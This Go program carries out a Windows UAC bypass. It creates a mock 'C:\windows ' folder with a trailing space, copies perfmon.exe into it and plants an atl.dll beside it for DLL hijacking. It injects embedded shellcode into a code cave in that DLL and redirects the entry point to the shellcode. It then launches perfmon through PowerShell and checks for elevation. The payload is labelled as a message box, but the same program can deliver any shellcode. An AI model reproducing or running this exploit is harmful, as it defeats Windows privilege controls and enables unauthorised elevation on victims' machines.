package main

import (
	_ "embed"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"github.com/Binject/debug/pe"
)

//go:embed atl.dll
var atlDLL []byte

func main() {
	windir := `C:\windows `
	sys32dir := filepath.Join(windir, "system32")

	if err := os.Mkdir(`\\?\`+windir, 0755); err != nil && !os.IsExist(err) {
		log.Fatalf("Failed to create directory %s: %v", windir, err)
	}

	if err := os.Mkdir(`\\?\`+sys32dir, 0755); err != nil && !os.IsExist(err) {
		log.Fatalf("Failed to create directory %s: %v", sys32dir, err)
	}

	displacedDLLPath := filepath.Join(sys32dir, "atl.dll")
	err := os.WriteFile(`\\?\`+displacedDLLPath, atlDLL, 0644)
	if err != nil {
		log.Fatalf("Failed to write embedded atl.dll: %v", err)
	}

	legitPerfmonPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "perfmon.exe")
	newPerfmonPath := filepath.Join(sys32dir, "perfmon.exe")

	perfmonBytes, err := os.ReadFile(legitPerfmonPath)
	if err != nil {
		log.Fatalf("Failed to read perfmon.exe: %v", err)
	}

	if err := os.WriteFile(`\\?\`+newPerfmonPath, perfmonBytes, 0755); err != nil {
		log.Fatalf("Failed to write perfmon.exe: %v", err)
	}
	fmt.Println("Created directories and copied files.")

	shellcode := getEmbeddedShellcode()
	fmt.Printf("Using embedded shellcode (%d bytes)\n", len(shellcode))

	fmt.Println("Patching atl.dll with debug/pe...")
	
	if err := patchDLLWithShellcode(`\\?\`+displacedDLLPath, shellcode); err != nil {
		log.Fatalf("Failed to patch DLL: %v", err)
	}

	fmt.Println("Successfully patched atl.dll with new section.")

	if _, err := os.Stat(`\\?\` + newPerfmonPath); err != nil {
		log.Fatalf("Perfmon.exe not found at expected location: %v", err)
	} else {
		fmt.Println("Perfmon.exe found in trailing space directory")
	}
	
	if _, err := os.Stat(`\\?\` + displacedDLLPath); err != nil {
		log.Fatalf("atl.dll not found at expected location: %v", err)
	} else {
		fmt.Println("atl.dll found in trailing space directory")
	}

	perfmonInfo, _ := os.Stat(`\\?\` + newPerfmonPath)
	atlInfo, _ := os.Stat(`\\?\` + displacedDLLPath)
	fmt.Printf("Perfmon.exe size: %d bytes\n", perfmonInfo.Size())
	fmt.Printf("atl.dll size: %d bytes\n", atlInfo.Size())

	fmt.Println("\n[+] Executing perfmon.exe from trailing space directory [+]")
	fmt.Printf("Executing: %s\n", newPerfmonPath)
	
	cmd := exec.Command("powershell", "-c", "Start-Process", "'"+newPerfmonPath+"'")
	
	if err := cmd.Start(); err != nil {
		log.Fatalf("Failed to execute perfmon.exe: %v", err)
	}
    time.Sleep(3 * time.Second)
	
	fmt.Println("\n[+] Checking perfmon.exe elevation status [+]")
	err = checkPerfmonElevation()
	if err != nil {
		fmt.Printf("Error checking perfmon elevation: %v\n", err)
	}
	
	fmt.Println("UAC bypass complete")
}

func checkPerfmonElevation() error {
	psCommand := `Get-Process | Add-Member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Where-Object {$_.Name -eq 'perfmon'} | Format-Table Name,Elevated -AutoSize`
	
	cmd := exec.Command("powershell", "-c", psCommand)
	output, err := cmd.Output()
	if err != nil {
		return fmt.Errorf("failed to run PowerShell command: %v", err)
	}
	
	result := string(output)
	fmt.Printf("PowerShell elevation check result:\n%s", result)
	lines := strings.Split(result, "\n")
	for _, line := range lines {
		if strings.Contains(strings.ToLower(line), "perfmon") {
			if strings.Contains(strings.ToLower(line), "true") {
				fmt.Println("SUCCESS: perfmon.exe is running elevated")
				return nil
			} else if strings.Contains(strings.ToLower(line), "false") {
				fmt.Println("perfmon.exe is running but NOT elevated")
				return nil
			}
		}
	}
	
	fmt.Println("⚠️  perfmon.exe process not found or elevation status unclear")
	return nil
}

func patchDLLWithShellcode(dllPath string, shellcode []byte) error {
	fmt.Printf("Patching DLL with shellcode injection...\n")

	originalBytes, err := os.ReadFile(dllPath)
	if err != nil {
		return fmt.Errorf("failed to read original file: %v", err)
	}

	file, err := pe.Open(dllPath)
	if err != nil {
		return fmt.Errorf("failed to open PE file: %v", err)
	}
	defer file.Close()

	textSection := findSection(file, ".text")
	if textSection == nil {
		return fmt.Errorf("could not find .text section")
	}

	fmt.Printf("Found .text section at RVA 0x%x, size: %d\n", textSection.VirtualAddress, textSection.Size)

	textData, err := textSection.Data()
	if err != nil {
		return fmt.Errorf("failed to read .text section: %v", err)
	}

	caveOffset := findCodeCave(textData, len(shellcode)+10) 
	if caveOffset == -1 {
		return fmt.Errorf("could not find suitable code cave for shellcode")
	}

	fmt.Printf("Found code cave at offset 0x%x in .text section\n", caveOffset)

	fileOffset := int(textSection.Offset) + caveOffset
	
	copy(originalBytes[fileOffset:], shellcode)
	
	fmt.Printf("Patched shellcode at file offset 0x%x\n", fileOffset)

	var entryPoint uint32
	if file.OptionalHeader != nil {
		switch oh := file.OptionalHeader.(type) {
		case *pe.OptionalHeader32:
			entryPoint = oh.AddressOfEntryPoint
		case *pe.OptionalHeader64:
			entryPoint = oh.AddressOfEntryPoint
		}
	}

	entryPointFileOffset := rvaToFileOffset(file, entryPoint)
	if entryPointFileOffset == -1 {
		return fmt.Errorf("could not find entry point in file")
	}

	shellcodeRVA := textSection.VirtualAddress + uint32(caveOffset)
	
	fmt.Printf("Entry point at file offset 0x%x, shellcode RVA: 0x%x\n", entryPointFileOffset, shellcodeRVA)

	jumpInstruction := createRelativeJump(entryPoint, shellcodeRVA)
	
	fmt.Printf("Created jump instruction: %x\n", jumpInstruction)

	copy(originalBytes[entryPointFileOffset:], jumpInstruction)

	if err := os.WriteFile(dllPath, originalBytes, 0644); err != nil {
		return fmt.Errorf("failed to write modified PE file: %v", err)
	}

	fmt.Printf("Successfully patched DLL with shellcode injection\n")
	return nil
}

func findSection(file *pe.File, name string) *pe.Section {
	for _, section := range file.Sections {
		if section.Name == name {
			return section
		}
	}
	return nil
}

func findCodeCave(data []byte, minSize int) int {
	consecutiveZeros := 0
	for i, b := range data {
		if b == 0 {
			consecutiveZeros++
			if consecutiveZeros >= minSize {
				return i - consecutiveZeros + 1
			}
		} else {
			consecutiveZeros = 0
		}
	}
	return -1
}

func rvaToFileOffset(file *pe.File, rva uint32) int {
	for _, section := range file.Sections {
		if rva >= section.VirtualAddress && rva < section.VirtualAddress+section.VirtualSize {
			return int(section.Offset + (rva - section.VirtualAddress))
		}
	}
	return -1
}

func createRelativeJump(fromRVA, toRVA uint32) []byte {
	offset := int32(toRVA) - int32(fromRVA) - 5
	
	return []byte{
		0xE9, // JMP rel32
		byte(offset),
		byte(offset >> 8),
		byte(offset >> 16),
		byte(offset >> 24),
	}
}

func uint32ToBytes(val uint32) []byte {
	return []byte{
		byte(val),
		byte(val >> 8),
		byte(val >> 16),
		byte(val >> 24),
	}
}

func uint64ToBytes(val uint64) []byte {
	return []byte{
		byte(val),
		byte(val >> 8),
		byte(val >> 16),
		byte(val >> 24),
		byte(val >> 32),
		byte(val >> 40),
		byte(val >> 48),
		byte(val >> 56),
	}
}

func align(size, alignment, base uint32) uint32 {
	if alignment == 0 {
		return base + size
	}
	if size%alignment == 0 {
		return base + size
	}
	return base + ((size/alignment)+1)*alignment
}

// messagebox shellcode :3
func getEmbeddedShellcode() []byte {
	hexString := "4883ec284883e4f0488d1566000000488d0d52000000e89e0000004c8bf8488d0d5d000000ffd0488d155f000000488d0d4d000000e87f0000004d33c94c8d0561000000488d154e0000004833c9ffd0488d1556000000488d0d0a000000e8560000004833c9ffd04b45524e454c33322e444c4c004c6f61644c69627261727941005553455233322e444c4c004d657373616765426f784100636172766564202D206869004d657373616765004578697450726f63657373004883ec28654c8b0425600000004d8b40184d8d60104d8b0424fc498b7860488bf1ac84c074268a2780fc617c0380ec203ae0750848ffc748ffc7ebe54d8b004d3bc475d64833c0e9a7000000498b5830448b4b3c4c03cb4981c188000000458b294d85ed75084833c0e9850000004e8d042b458b71044d03f5418b4818458b50204c03d3ffc94d8d0c8a418b394803fb488bf2a675088a0684c07409ebf5e2e64833c0eb4e458b48244c03cb66418b0c49458b481c4c03cb418b0489493bc57c2f493bc6732a488d3418488d7c24304c8be7a4803e2e75faa4c707444c4c00498bcc41ffd7498bcc488bd6e914ffffff4803c34883c428c3"

	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}
